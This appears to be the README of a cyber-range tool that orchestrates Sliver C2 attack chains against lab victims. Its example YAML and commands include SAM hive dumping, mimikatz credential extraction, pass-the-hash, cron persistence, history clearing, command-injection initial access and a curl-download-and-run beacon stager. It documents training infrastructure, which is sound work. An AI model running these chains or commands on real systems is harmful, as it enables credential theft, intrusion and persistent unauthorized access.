# Sliver Scenario Orchestrator

A service wrapper on top of Sliver's gRPC API that supports building and executing multi-stage attack chains for cyber range training. Chains are directed acyclic graphs (DAGs) of steps, where steps can forward their output to later steps and gate execution on conditions.

All commands in this README are run from the **repo root** (`sliver-orchestrator/`).

## Features

- **Attack chains as DAGs** — multi-stage scenarios in one YAML; steps forward output to later steps and gate on conditions (`eq`/`contains`/`matches`/`gt`/`lt`).
- **Atomic Red Team library** — techniques loaded from ART-layout YAMLs and executed over Sliver sessions.
- **Initial access** — a chain can *obtain* its first session via pluggable modules: `external` (any exploit script) and `metasploit` (msfconsole, with brute-force). See [Initial access](#initial-access-targets--initial_access-action).
- **Lateral movement / multi-beacon** — per-step `session_id` and output-variable session binding.
- **Weaponizer** — on-demand implant delivery (`GET /api/v1/implant/{linux,windows}`), built and cached per (arch, c2, port).
- **REST API + SSE** — build, execute, and stream executions live.
- **Web UI** — React frontend for sessions, chains, and live execution streams.
- **Dockerized E2E lab** — `make up` brings up C2 + frontend; victims run as containers or VMs.

## Quick Start (Docker)

Everything is dockerized — you need only **Docker >= 24 with Compose v2**. `scenario-server` is compiled inside the C2 image, so no host Go toolchain is required.

### 1. Get the workspace (atomics)

The C2 mounts atomics from the `sliver-orchestrator-workspace` git submodule (atomics already included):

```bash
git submodule update --init --remote
```

### 2. Start the stack

```bash
make up            # C2 (Sliver + scenario-server) + web frontend
make logs          # follow C2 logs (first run unpacks Sliver assets, ~1-2 min)

make up-victim     # optional: also start one Linux victim container
```

Exposed on the host:
- `http://127.0.0.1:8080` — Web UI
- `http://127.0.0.1:18080` — Scenario REST API
- `127.0.0.1:31337` — Sliver gRPC (for `sliver-client`)
- `:80` — Sliver HTTP C2 (beacon callback; published on `0.0.0.0` for VMs)

### 3. Run an example chain

```bash
./examples/run.sh examples/linux-full-chain.yaml
```

### 4. Check the API

```bash
curl http://127.0.0.1:18080/api/v1/health
curl http://127.0.0.1:18080/api/v1/atomics | jq .
curl http://127.0.0.1:18080/api/v1/sessions | jq .
```

Stop everything (and drop volumes) with `make down`. Run `make help` for all targets.

### Refreshing atomics manually

If you don't use the submodule, populate `sliver-orchestrator-workspace/atomics` yourself:

```bash
chmod +x atomic/fetch.sh
./atomic/fetch.sh sliver-orchestrator-workspace/atomics
```

## Lab Setup

### Topology

The root `docker-compose.yml` is the E2E stack. `make up` starts the C2 + web
frontend; victims are optional and picked with a profile — `make up-web` adds the
vulnerable web target (initial-access demo), `make up-victim` adds a self-beaconing
Linux victim. Inter-container URLs use the C2's **static IP** (not its name), so the
stack works even where container DNS is unavailable (e.g. rootless podman).

```
  browser ── host :8080 ──▶ frontend (nginx SPA)  172.20.0.40
                                 │  proxies /api/v1  ─────────┐
                                 ▼                            ▼
  operator ─ host :18080 REST ─┐                    ┌───────────────────────────┐
             host :31337 gRPC ─┼──────────────────▶ │  c2   172.20.0.10          │
  victims  ─ host :80  C2 HTTP ┘                    │  sliver-server + scenario  │
                                                    └─────────────┬─────────────┘
        initial_access exploit ───┐  beacons call back to C2_HOST │
                     ┌────────────┴──────────────┬───────────────┴────────────┐
                     ▼                           ▼                             ▼
              victim-web  172.20.0.30     victim  172.20.0.20            external VM
              (vulnerable target)         (self-beaconing)             C2_HOST=<host IP>
```

Two victim paths:

- **`make up-web`** — the vulnerable `victim-web` target does **not** beacon on its
  own. A chain's `initial_access` step exploits its command-injection endpoint to
  stage a Sliver beacon and obtain a session (see the demo below).
- **`make up-victim`** — the `victim` container polls `GET /api/v1/health`, downloads
  the Linux implant from `GET /api/v1/implant/linux`, and checks in by itself. On the
  first implant request the C2 starts a Sliver HTTP listener on `:80` and builds the
  beacon (~1-2 min). The session then appears in `GET /api/v1/sessions`.

Useful commands (from repo root):

```bash
make up            # C2 + frontend
make up-web        # + vulnerable web target (initial-access demo)
make up-victim     # + self-beaconing Linux victim
make logs          # follow C2 logs
make ps            # status
make down          # stop + remove volumes
```

### Web initial-access demo

With `make up-web` running, breach the web target and capture the session in one chain:

```bash
./examples/run.sh examples/initial-access-web.yaml
```

The `breach` step exploits `victim-web`'s `GET /ping?host=` command injection to make
it download and run the Sliver beacon, waits for the new session, binds it to
`{{web1_session}}`, then the `recon` step runs `id && hostname` on it.

### Reaching VMs (not just containers)

Container victims reach the C2 by its compose IP. **Off-host victims — VMs and bare
metal — attach over the host network**, so the C2's REST, gRPC and Sliver HTTP C2
ports are published on `0.0.0.0`:

1. `cp .env.example .env` and set `C2_HOST` to an address the VM can route to (the
   Docker host's LAN IP). Implants are then built to beacon to that address.
2. Bring the stack up. VMs fetch an implant from `http://<C2_HOST>:18080/api/v1/implant/{linux,windows}`
   and beacon back to `<C2_HOST>:80`.

If host port `80` is taken, set `SLIVER_C2_PORT` in `.env` and fetch implants with
`?port=<that port>`. The bundled **`Vagrantfile`** provisions a Windows + Linux
pivoting VM lab that points at `C2_HOST` out of the box — see
[`lab/vm-setup/SETUP.md`](lab/vm-setup/SETUP.md).

### Extended lab (multiple victims + vulnweb)

`lab/docker-compose.yml` is a fuller lab on its own network: a second Linux victim
plus `victim-web`, a deliberately-vulnerable app used as the initial-access target
in [`examples/initial-access-web.yaml`](examples/initial-access-web.yaml). Start it
with `make lab`.

## Atomics Library

Technique definitions use the [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) layout: `T1059.001/T1059.001.yaml`. The loader accepts both `.yaml` and `.yml` and scans subdirectories under the atomics root.

The Docker lab reads atomics from the in-repo `sliver-orchestrator-workspace/atomics` git submodule. It includes atomics already — initialize it with `git submodule update --init --remote`.

To refresh atomics manually:

```bash
chmod +x atomic/fetch.sh
./atomic/fetch.sh sliver-orchestrator-workspace/atomics
```

Optional cleanup after download:

```bash
./atomic/fetch.sh sliver-orchestrator-workspace/atomics --clean
```

`atomic/fetch.sh` downloads the GitHub archive and copies only the upstream `atomics/` tree. It does not install `Invoke-AtomicRedTeam` or PowerShell helper scripts.

For local execution on the C2 host, you can use [GoART](https://github.com/lcensies/go-atomicredteam):

```bash
go install github.com/lcensies/go-atomicredteam/cmd/goart@latest
goart --technique T1059.001 --index 0 --atomics-path ./sliver-orchestrator-workspace/atomics
```

## Building

The Docker image builds `scenario-server` for you (`make up`). You only need a
standalone build for local development outside Docker:

```bash
make scenario-server   # build ./scenario-server (alias: make scenario)
```

`scenario-server` requires CGO for SQLite — install a C toolchain first, e.g.
`sudo apt install build-essential libsqlite3-dev`.

Chains are executed with [`examples/run.sh`](examples/run.sh) (load → execute →
stream) or directly against the REST API.

## Scenario Discovery

At startup the server scans the configured **scenario directories** and seeds every
definition it finds into the store, so they appear in `GET /api/v1/chains` and the
web UI without a manual upload. Defaults:

- `examples/` (this repo)
- `sliver-orchestrator-workspace/scenarios/` (the workspace submodule)

In Docker both are mounted and wired via `SCENARIO_DIRS=/opt/scenario-examples:/opt/workspace/scenarios`
(see `docker-compose.yml`). Override the list anywhere with the `--scenarios` flag or
`SCENARIO_DIRS` env (`:` or `,` separated). Add more dirs freely.

A **scenario** in a directory is either:

- a `*.yaml` / `*.yml` file, or
- a **folder** bundling the definition plus its resources (scripts, wordlists,
  fixtures). The definition is `scenario.yaml`/`chain.yaml` if present, otherwise the
  single `*.yaml`/`*.yml` in the folder.

Inside a bundle, reference co-located resources with the `{{scenario_dir}}` token —
it is rewritten to the bundle's absolute path at load time:

```
scenarios/web-breach/
├── scenario.yaml        # run: '["python3", "{{scenario_dir}}/web_rce.py"]'
└── web_rce.py           # bundled exploit, shipped with the scenario
```

Files are the source of truth: a definition's `id` (explicit, else derived from the
file/folder name) is **upserted** on start, so edits on disk are picked up.
Definitions with an invalid step graph are skipped with a warning.

**Live pickup.** Set `SCENARIO_WATCH=<seconds>` (the compose lab uses `5`) to re-scan the
dirs on an interval and upsert changed definitions **without a restart** — only entries
whose content actually changed are rewritten, so unrelated chains are left alone.

**Write-back.** By default the DB is the only home for chains created/edited in the UI.
Set `SCENARIO_WRITE_DIR` to also persist them to disk as `<dir>/<id>.yaml` — use `last`
for the last scenario dir (the compose lab uses the writable workspace; `examples` is
mounted read-only). Combined with watching, GUI edits round-trip to files and back.

> Deletions are intentionally not mirrored in either direction: removing a file does not
> drop the chain from the store, and deleting a chain in the UI does not remove its file.

## Chain YAML Schema

```yaml
id: lateral-movement-demo          # unique chain ID
name: "Pass-the-Hash Demo"
description: "Dump creds then move laterally"
mitre_tactics: [credential-access, lateral-movement]
tags: [demo, windows]

steps:
  - id: dump_sam                   # unique step ID within the chain
    name: "Dump SAM hive"
    action:
      type: command                # command | atomic | upload | binary | sliver_rpc
      command:
        interpreter: powershell    # sh | bash | powershell | cmd
        cmd: "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y"
    output_var: dump_stdout        # capture stdout → {{dump_stdout}} for later steps
    timeout: "60s"
    on_fail: abort                 # abort | continue | continue_no_err | skip_dependents

  - id: run_mimikatz
    depends_on: [dump_sam]
    action:
      type: binary
      binary:
        url: "http://192.168.56.10:8888/mimikatz.exe"  # C2 downloads then uploads
        remote_path: "C:\\Windows\\Temp\\mimi.exe"
        args: "privilege::debug sekurlsa::logonpasswords exit"
        platform: windows
        cleanup: true              # remove after execution
    # Extract NTLM hash and username into separate variables
    output_extract:
      - var: ntlm_hash
        regex: "NTLM\\s*:\\s*([0-9a-fA-F]{32})"
        group: 1
      - var: cred_user
        regex: "Username\\s*:\\s*(\\S+)"
        group: 1

  - id: extract_hash
    depends_on: [dump_sam]
    conditions:
      - dump_stdout|contains: "The operation completed successfully"
    action:
      type: atomic                 # delegates to atomic library
      atomic_ref:
        id: T1003.002              # technique ID
        test: 0                    # zero-based test index (or use name/guid)
        name: ""                   # alternative: exact test name
        guid: ""                   # alternative: auto_generated_guid
        args:                      # override input_arguments defaults
          output_dir: "C:\\Windows\\Temp"

  - id: pass_the_hash
    depends_on: [run_mimikatz]
    action:
      type: atomic
      atomic_ref:
        id: T1550.002
        test: 0
        args:
          ntlm_hash: "{{ntlm_hash}}"   # {{VarName}} substitution from prior output_extract
          username:  "{{cred_user}}"

  - id: discovery
    # no depends_on → runs in parallel with pass_the_hash once dump_sam completes
    action:
      type: atomic
      atomic_ref: { id: T1082, test: 0 }
```

### Action types

| Type | Description |
|---|---|
| `command` | Raw command via `interpreter` (sh/bash/powershell/cmd) |
| `atomic` | Resolves a technique from `atomics/` and executes it as a command |
| `upload` | Copies a file from a C2-server path to `remote_path` on the session |
| `binary` | Fetches a binary (embedded base64 `data` or `url`), uploads to victim, executes |
| `sliver_rpc` | Named Sliver RPC call (Ps, Screenshot, Ifconfig, Netstat) |

#### `binary` action fields

| Field | Description |
|---|---|
| `data` | Base64-encoded binary payload (embedded in the chain definition) |
| `url` | URL the C2 server downloads the binary from before uploading |
| `remote_path` | Destination on the victim (auto-generated temp path if omitted) |
| `args` | Arguments appended when executing the binary |
| `platform` | `linux` (default) or `windows` — controls chmod, delete commands |
| `cleanup` | If `true`, remove the binary from the victim after execution |

Exactly one of `data` or `url` must be set.

#### `probe` action fields

Runs a platform-appropriate command on the victim via Sliver and optionally validates the result. When `match` is set, exit 0 = match (continue), exit 1 = no match (triggers `on_fail`). Without `match`, always exits 0 — useful for pure discovery/capture.

| Field | Description |
|---|---|
| `kind` | What to probe: `os`, `kernel`, `arch`, `software_exists`, `software_version` |
| `software` | Program name (required for `software_exists` / `software_version`) |
| `match` | Go regex; step exits 1 if stdout doesn't match. Supports `{{VarName}}` |
| `platform` | `linux` (default), `windows`, or `darwin` — selects the detection command |

| Kind | Linux/macOS command | Windows command |
|---|---|---|
| `os` | `uname -s` | `wmic os get Caption /value` |
| `kernel` | `uname -r` | `wmic os get Version /value` |
| `arch` | `uname -m` | `wmic os get OSArchitecture /value` |
| `software_exists` | `which <software>` | `where <software>` |
| `software_version` | `<sw> --version \|\| <sw> -version \|\| <sw> version` | `<sw> --version` |

#### `python` action fields

Executes a Python 3 script **on the C2 server** (not on the victim). Scripts can use [sliver-py](https://github.com/sliverarmory/sliver-py) for full Sliver interaction, or any library installed on the C2 host. stdout/stderr/exit-code are treated as the step's output.

| Field | Description |
|---|---|
| `script` | Path to a `.py` file on the C2 server filesystem |
| `inline` | Inline Python source (written to a temp file before execution) |
| `args` | Extra CLI arguments appended after the script path. Supports `{{VarName}}` |
| `env` | Extra environment variables for the script. Values support `{{VarName}}` |

Built-in env vars always injected:
- `SLIVER_CONFIG` — path to the Sliver operator `.cfg` file (for `sliver-py`)
- `SESSION_ID` — the current target session ID

Exactly one of `script` or `inline` must be set.

#### Probe + Python example

```yaml
steps:
  # ── Environment checks ─────────────────────────────────────────────────────
  - id: check_os
    name: "Detect victim OS"
    action:
      type: probe
      probe:
        kind: os
        platform: linux      # use "windows" for Windows targets
    output_var: victim_os    # captures "Linux" / "Darwin" / etc.

  - id: check_kernel
    depends_on: [check_os]
    conditions:
      - victim_os|contains: Linux
    action:
      type: probe
      probe:
        kind: kernel
        platform: linux
        match: "^5\\..*"     # require kernel >= 5.x (regex match)
    output_var: kernel_ver
    on_fail: abort           # stop chain if kernel too old

  - id: check_python3
    depends_on: [check_os]
    action:
      type: probe
      probe:
        kind: software_exists
        software: python3
        platform: linux

  - id: check_curl_version
    depends_on: [check_os]
    action:
      type: probe
      probe:
        kind: software_version
        software: curl
        platform: linux
    output_var: curl_ver

  # ── Custom Python step using sliver-py ──────────────────────────────────────
  - id: custom_recon
    depends_on: [check_os]
    action:
      type: python
      python:
        script: /opt/scenarios/scripts/recon.py
        env:
          TARGET_HOSTNAME: "{{hostname}}"   # forward captured var to script
    output_var: recon_result
    output_extract:
      - var: open_port
        regex: "OPEN:(\\d+)"
        group: 1

  - id: inline_check
    action:
      type: python
      python:
        inline: |
          import os, sys
          session_id = os.environ["SESSION_ID"]
          print(f"Running against session: {session_id}")
          sys.exit(0)
```

A minimal `sliver-py` script (`/opt/scenarios/scripts/recon.py`):

```python
import asyncio, os, sys
from sliver import SliverClientConfig, SliverClient

async def main():
    cfg = SliverClientConfig.parse_config_file(os.environ["SLIVER_CONFIG"])
    client = SliverClient(cfg)
    await client.connect()
    session_id = os.environ["SESSION_ID"]
    interact = await client.interact_session(session_id)
    ls = await interact.ls("/tmp")
    for entry in ls.Files:
        print(entry.Name)

asyncio.run(main())
```

### Output variable passing

Steps forward data to later steps through named variables referenced as `{{VarName}}`.

| Field | Description |
|---|---|
| `output_var` | Capture full stdout as a named variable |
| `output_filter` | When set alongside `output_var`, extract a regex capture group instead of full stdout |
| `output_extract` | List of `{var, regex, group}` — extract multiple named variables from stdout |
| `session_id` | Optional per step: Sliver session UUID for this step only; supports `{{VarName}}` |

`{{VarName}}` is substituted in `command.cmd`, `binary.url`, `binary.remote_path`, `binary.args`, `upload.local_path`, `upload.remote_path`, `atomic_ref.args.*`, `sliver_rpc.params.*`, and per-step `session_id` (see below).

### Per-step `session_id` (multiple beacons)

By default every step uses the `session_id` from `POST /chains/{id}/execute`. A step may set its own `session_id` to target another Sliver session (another beacon). Values support `{{VarName}}` substitution from earlier steps, so you can capture a peer UUID (for example from a prior `command` or `python` step) and pivot in the same execution.

Omit `session_id` or leave it empty to keep using the execution default. If substitution yields an empty string, the execution default is used.

For **lateral movement** you can combine this with:

- **Two beacons:** primary session in `execute`, later steps with `session_id: "{{peer_session}}"` — see [`examples/lateral-two-beacons.yaml`](examples/lateral-two-beacons.yaml).
- **One beacon, remote execution:** run SSH, WinRM, PsExec, or atomics from the first host toward another machine — see [`examples/lateral-inband-reachability.yaml`](examples/lateral-inband-reachability.yaml).
- **Python on C2:** a `python` step can still list sessions via sliver-py and interact with multiple beacons; with per-step `session_id`, built-in `SESSION_ID` for that step matches the session the server passes to sliver-py for that step.

```yaml
  - id: recon
    action:
      type: command
      command:
        interpreter: sh
        cmd: "ip route | head -5"
    output_var: route_raw               # full stdout → {{route_raw}}
    output_filter:
      regex: "default via ([\d.]+)"    # extract just the gateway IP
      group: 1                          # capture group 1 (1-based, default 1)
    # output_var now stores the extracted gateway IP, not the full route output

  - id: multi_extract
    action:
      type: command
      command:
        interpreter: sh
        cmd: "id && hostname"
    output_extract:                     # pull multiple vars from one step
      - var: uid
        regex: "uid=(\\d+)"
        group: 1
      - var: hostname
        regex: "^(\\S+)$"
        group: 1
```

### Initial access (`targets` + `initial_access` action)

By default a chain runs against a session you pass to `execute`. The `initial_access`
action lets a chain *obtain* that first session itself — exploit a target, drop a
Sliver beacon, and bind the resulting session so later steps use it. This makes true
end-to-end scenarios (initial access → post-exploitation) expressible in one YAML file.

Declare the hosts under a top-level `targets:` block and reference one by name from an
`initial_access` step. The new session's UUID is emitted as the step's stdout, so the
usual `output_var` captures it and downstream steps target it with `session_id: "{{var}}"`:

```yaml
targets:
  - name: web1
    host: 172.20.0.30
    port: 8080
    attrs: { path: /ping }          # arbitrary, forwarded to the module

steps:
  - id: breach
    action:
      type: initial_access
      initial_access:
        target: web1                 # references targets[].name
        module: external             # registry key ("external" ships built-in)
        config:
          run: '["python3", "/opt/exploits/web_rce.py"]'
          implant_url: "http://172.20.0.10:8080/api/v1/implant/linux?c2=172.20.0.10"
        wait:
          timeout: "240s"            # how long to wait for the beacon (default 120s)
          match_hostname: "victim-web"  # optional correlation filter
          match_os: "linux"          # optional correlation filter
    output_var: web1_session         # <- new session UUID captured here
    timeout: "300s"                  # must exceed wait.timeout + exploit time

  - id: recon
    depends_on: [breach]
    session_id: "{{web1_session}}"
    action: { type: command, command: { cmd: "id" } }
```

How the new session is found: the executor snapshots Sliver's sessions before the
module runs, then polls `GetSessions` until a session that wasn't there before appears
(and matches the optional `match_hostname` / `match_os` filters), returning its UUID.

**Modules are pluggable.** A module is anything that breaches a target and installs a
beacon — it never needs to know Sliver's session UUID (the framework correlates that).

- **`external`** (built-in) runs *any* executable/script — a custom Python exploit,
  a shell one-liner, or even `msfconsole -r` via a wrapper script. Contract:
  the full request is written as JSON to the child's stdin, and the child prints a JSON
  result on stdout:

  ```
  stdin  : {"target": {"name","host","port","attrs"}, "config": {…}}
  stdout : {"ok": true, "note": "…", "hostname": "…"}   # hostname is an optional hint
  ```

  If stdout isn't JSON, success is inferred from the process exit code. Config keys:
  `run` (argv, JSON array or whitespace-split string) or `shell` (a `sh -c` string).

- **`metasploit`** (built-in) drives Metasploit Framework exploits via `msfconsole`
  resource scripts. It supports **brute-force mode**: when `module` and/or `payload`
  are JSON arrays, every combination is tried in sequence until a session opens.

  | Config key | Required | Description |
  |---|---|---|
  | `module` | yes | MSF exploit module (string or JSON array for brute-force) |
  | `payload` | no | Payload name (string or JSON array for brute-force) |
  | `lhost` | yes | Listen host for reverse connections |
  | `lport` | no | Listen port (default `4444`) |
  | `options` | no | JSON object of extra MSF `set` commands, e.g. `{"THREADS":"10"}` |
  | `target_index` | no | MSF target index (`set TARGET`) |
  | `session_wait` | no | Seconds to wait for session after exploit (default `15`) |
  | `msfconsole` | no | Path to msfconsole binary (default `msfconsole`) |
  | `stop_on_success` | no | `false` to run all brute-force combos (default `true`) |
  | `post_exploit_cmd` | no | Command to run in the opened session (e.g. stage a Sliver implant) |
  | `extra_args` | no | Extra arguments appended to msfconsole |

  The module generates a resource script (`use`, `set RHOSTS/RPORT/LHOST/LPORT/payload/options`,
  `exploit -j -z`, `sleep`, `sessions -l`, optional Ruby post-exploit block, `exit -y`),
  runs `msfconsole -q -r <tmpfile>`, and parses stdout for `session N opened` to detect success.

- **Native modules**: implement `initialaccess.Module` (`Name()` + `Run(ctx, Request)`)
  and register it in `initialaccess.DefaultRegistry()`. Referenced by its `Name()`.

See `examples/initial-access-web.yaml` for a runnable example using the `external` module
against the lab's vulnweb target, and `examples/initial-access-metasploit.yaml` for a
Metasploit brute-force example against a Linux SSH target.

### Condition operators

| Op | Description |
|---|---|
| `eq` / `neq` | Exact string equality |
| `contains` | Substring match |
| `matches` | Go regexp match |
| `gt` / `lt` | Numeric comparison (for exit_code or numeric output) |

Set `negate: true` to invert any condition.

Conditions can be written in two ways:

- **Explicit:** `var`, `op`, `value` (and optional `negate`).
- **Sigma-style:** a single key `var|op` with the value, e.g. `victim_os|contains: Linux` or `exit_code|eq: "0"`.

### Fail policies

| `on_fail` | Behaviour |
|---|---|
| `continue` | Log failure, continue other steps (default). Step counts as failed; chain reports failure at end if any step failed. |
| `continue_no_err` | Same as continue, but this step’s failure does **not** cause the chain to be reported as failed. Use for optional/non-critical steps. |
| `abort` | Stop the entire chain immediately |
| `skip_dependents` | Skip all steps that (transitively) depend on this one |

## REST API Reference

All endpoints are under `/api/v1/`.

### Health

```
GET /health
```

### Sessions (Sliver proxy)

```
GET /sessions
```
Returns active Sliver sessions: `[{id, name, os, hostname, username, pid}]`

### Implant delivery

```
GET /implant/linux?arch=amd64&c2=172.20.0.10&port=80
```

On the first call, the server:
1. Starts a Sliver HTTP listener on `c2:port` (idempotent — skips if one is already running).
2. Compiles a Linux beacon implant via the Sliver gRPC API (~1–2 min).
3. Caches the binary in-process; subsequent calls return it instantly.

Returns the ELF binary as `application/octet-stream`.

| Query param | Default | Description |
|---|---|---|
| `arch` | `amd64` | Target architecture: `amd64` or `arm64` |
| `c2` | `C2_HOST` env or `172.20.0.10` | C2 callback address for the beacon |
| `port` | `80` | HTTP listener port on the C2 |

The victim entrypoint calls this automatically:
```bash
curl http://172.20.0.10:8080/api/v1/implant/linux -o /usr/local/bin/sliver-beacon
chmod +x /usr/local/bin/sliver-beacon && /usr/local/bin/sliver-beacon &
```

### Atomics

```
GET /atomics?tactic=execution&platform=windows
GET /atomics/{technique_id}      e.g. /atomics/T1059.001
```

### Chains

```
POST   /chains                   body: Chain JSON
GET    /chains
GET    /chains/{id}
PUT    /chains/{id}
DELETE /chains/{id}
POST   /chains/{id}/execute      body: {"session_id": "...", "dry_run": false}
```

`execute` returns `{"execution_id": "..."}` immediately and runs the chain asynchronously.

`dry_run: true` validates the DAG and returns the resolved step order without executing.

### Executions

```
GET  /executions?chain_id={id}   list executions (optionally filtered by chain)
GET  /executions/{id}            status + all step logs
GET  /executions/{id}/stream     SSE live event stream
POST /executions/{id}/cancel
```

#### SSE event types

| Event | Payload |
|---|---|
| `step_start` | `{step_id}` |
| `step_done` | `{step_id, stdout, stderr, exit_code, duration_ms}` |
| `step_failed` | `{step_id, stdout, stderr, exit_code, error, duration_ms}` |
| `step_skipped` | `{step_id, message}` |
| `step_log` | Replay of a stored step log (sent first on stream connect) |
| `chain_done` | `{message}` |
| `chain_failed` | `{message}` |
| `done` | Stream close signal |

#### Example: stream an execution

```bash
EXEC_ID=$(curl -s -X POST http://localhost:8080/api/v1/chains/my-chain-id/execute \
  -H 'Content-Type: application/json' \
  -d '{"session_id":"abc123"}' | jq -r .execution_id)

curl -N http://localhost:8080/api/v1/executions/${EXEC_ID}/stream
```

## Configuration

Priority: CLI flags > `SCENARIO_*` env vars > YAML file > defaults.

| Flag | Env var | Default | Description |
|---|---|---|---|
| `--config` | `SCENARIO_SLIVER_CONFIG` | required | Sliver operator `.cfg` file path |
| `--atomics` | `SCENARIO_ATOMICS_DIR` | `./atomics` | Technique YAML directory |
| `--scenarios` | `SCENARIO_DIRS` | `examples`, `sliver-orchestrator-workspace/scenarios` | Dirs scanned at startup for scenarios (`:`/`,`-separated) |
| *(n/a)* | `SCENARIO_WATCH` | `0` | Seconds between re-scans for live pickup (`0` = off) |
| *(n/a)* | `SCENARIO_WRITE_DIR` | *(empty)* | Persist API-created/updated chains to `<dir>/<id>.yaml`; `last` = last scenario dir |
| `--db` | `SCENARIO_DB_PATH` | `./scenario.db` | SQLite database path |
| `--listen` | `SCENARIO_LISTEN` | `:8080` | HTTP listen address |
| `--allow-origin` | `SCENARIO_ALLOW_ORIGIN` | `*` | CORS Allow-Origin |
| *(n/a)* | `SCENARIO_C2_HOST` / `C2_HOST` | `172.20.0.10` | Beacon callback address for `GET /implant/linux` |

Optional YAML config file:

```yaml
sliver_config: /etc/sliver/scenario-operator.cfg
atomics_dir:   /opt/atomics
scenario_dirs: [/opt/scenario-examples, /opt/workspace/scenarios]
db_path:       /var/lib/scenario/scenario.db
listen:        :8080
allow_origin:  "*"
c2_host:       172.20.0.10   # address beacons call back to (GET /implant/linux)
log_level:     info
```

## Project Structure

Repo root = this directory (scenario/ in sliver monorepo, or the repo root when standalone).

```
.                    Go packages (cmd, api, chain, atomic, sliver, store, config)
├── cmd/server/      scenario-server entrypoint (main.go)
├── config/          Config loading (YAML + env)
├── chain/           Chain model, DAG resolver, condition evaluator, executor
├── atomic/          Fetch helper for upstream Atomic Red Team YAMLs
│   └── fetch.sh     Downloads upstream atomics into a local directory
├── initialaccess/   Initial-access modules (external, metasploit) + registry
├── weaponizer/      Implant build/delivery helpers
├── sliver/          Sliver gRPC client + step executor
├── store/           SQLite persistence (GORM)
└── api/             REST API handlers (Go 1.22 ServeMux)

docker-compose.yml   E2E stack: C2 + frontend (+ victim via `--profile victim`)
.env.example         C2_HOST / port knobs for VM (off-host) victims
Dockerfile           C2 image (multi-stage: builds scenario-server + runtime)
Vagrantfile          Windows + Linux pivoting VM lab (see lab/vm-setup/SETUP.md)

frontend/            React web UI (nginx SPA; proxies /api/v1 → c2), git submodule

sliver-orchestrator-workspace/atomics/   Mounted Atomic Red Team YAML library (submodule)
└── T*/T*.yaml       Upstream technique definitions used by the Docker lab

lab/
├── docker-compose.yml   Extended lab (2nd victim + vulnweb initial-access target)
├── Dockerfile.victim    Linux victim container image
├── Dockerfile.victim-web  Deliberately-vulnerable web target
├── exploits/        Initial-access module scripts (mounted at /opt/exploits)
├── vm-setup/        VM lab setup guide
└── provision/       Shell + PowerShell provisioning scripts

examples/            Ready-to-use chain YAML files
├── t1082-basic-discovery.yaml        Single atomic test (beginner)
├── linux-full-chain.yaml             Full post-exploitation chain (advanced)
├── lateral-two-beacons.yaml          Per-step session_id / second beacon
├── lateral-inband-reachability.yaml  Single session; probe toward another host
└── run.sh                            Helper script: load + execute + stream results
```

## Examples

The `examples/` directory contains ready-to-use chain definitions in YAML.
The API accepts both JSON and YAML (`Content-Type: application/yaml`).

### Example 1 — Single Atomic Test (`t1082-basic-discovery.yaml`)

The simplest possible chain: one step, one Atomic Red Team test.
Good for verifying that the lab is working end-to-end.

**MITRE:** T1082 – System Information Discovery

```yaml
steps:
  - id: sysinfo
    name: "System Information Discovery"
    action:
      type: atomic
      atomic_ref:
        id: T1082
        test: 0          # "System info enumeration (Linux)"
    output_var: sysinfo_out
    timeout: "30s"
```

### Example 2 — Full Linux Post-Exploitation Chain (`linux-full-chain.yaml`)

A realistic multi-phase attack chain covering four tactics:

| Phase | Steps | Techniques |
|---|---|---|
| 1 — Probe | `check_os`, `check_kernel` | Probe |
| 2 — Discovery | `sysinfo`, `account_discovery`, `net_config`, `net_connections`, `file_discovery` | T1082, T1087, T1016, T1049, T1083 |
| 3 — Persistence | `check_crontab`, `cron_persistence` | T1059.004 |
| 4 — Evasion | `clear_history` | T1070.001 |

Demonstrates:
- **Parallel execution** — all Phase 2 steps share `depends_on: [check_os]` so they run concurrently
- **Conditions** — sigma-style (e.g. `victim_os|contains: Linux`) gates Linux-only steps
- **`skip_dependents`** — cron persistence silently skips if crontab is missing
- **Output capture** — `output_var` stores stdout for later `{{VarName}}` substitution

### Example 3 — Lateral movement (`lateral-two-beacons.yaml`, `lateral-inband-reachability.yaml`)

- **Two Sliver sessions:** [`examples/lateral-two-beacons.yaml`](examples/lateral-two-beacons.yaml) runs on the primary beacon, stores a second session UUID in a variable, then runs a step with `session_id: "{{peer_session}}"`. Edit the placeholder UUID after `GET /api/v1/sessions` when you have two beacons.
- **One session, in-band:** [`examples/lateral-inband-reachability.yaml`](examples/lateral-inband-reachability.yaml) pings `172.20.0.21` from the compromised host (enable `victim-2` in the lab compose if you want the ping to succeed).

### Running examples with `run.sh`

```bash
# Start the stack first (if not already running)
make up-victim

# Example 1 — basic atomic test
./examples/run.sh examples/t1082-basic-discovery.yaml

# Example 2 — full attack chain
./examples/run.sh examples/linux-full-chain.yaml

# Example 3 — lateral movement demos (edit lateral-two-beacons UUID if using two beacons)
./examples/run.sh examples/lateral-inband-reachability.yaml
./examples/run.sh examples/lateral-two-beacons.yaml
```

The script:
1. Checks API health
2. Auto-selects the first active session
3. POSTs the YAML chain definition
4. Dry-runs to validate the DAG
5. Executes and streams results live with step-by-step output

**Manual equivalent (curl + jq):**

```bash
API=http://127.0.0.1:18080/api/v1
SESSION=$(curl -s $API/sessions | jq -r '.[0].id')

# Load the chain (YAML accepted)
CHAIN_ID=$(curl -s -X POST $API/chains \
  -H 'Content-Type: application/yaml' \
  --data-binary @examples/t1082-basic-discovery.yaml | jq -r .id)

# Execute
EXEC_ID=$(curl -s -X POST $API/chains/$CHAIN_ID/execute \
  -H 'Content-Type: application/json' \
  -d "{\"session_id\":\"$SESSION\"}" | jq -r .execution_id)

# Stream results
curl -N $API/executions/$EXEC_ID/stream
```

## Testing

Tests live in four layers. All run on dev-vm-3 from the repo root unless noted.

Go binary path: `/home/ubuntu/go-toolchain/bin/go`. CGO is required (SQLite).

### Unit + integration (Go)

```bash
CGO_ENABLED=1 /home/ubuntu/go-toolchain/bin/go test ./store/... ./chain/... ./tests/api/... -v -count=1
```

| Package | Tests | What it covers |
|---|---|---|
| `store` | 9 | SQLite CRUD, ordering, filtering |
| `chain` | 25 | DAG resolver, condition eval, executor (all `on_fail` policies, output vars, context cancel) |
| `tests/api` | 32 | Every HTTP endpoint via `httptest.Server` + stub Sliver RPC — no real C2 needed |

The `tests/api` suite uses a generated stub (`stub_rpc_test.go`) that satisfies all 186 methods of `rpcpb.SliverRPCClient`.

### API E2E (Python)

Starts a real `testserver` binary (built from `tests/cmd/testserver/`) against a temp SQLite file. No Sliver C2 required.

```bash
cd tests/e2e
uv run pytest -v
```

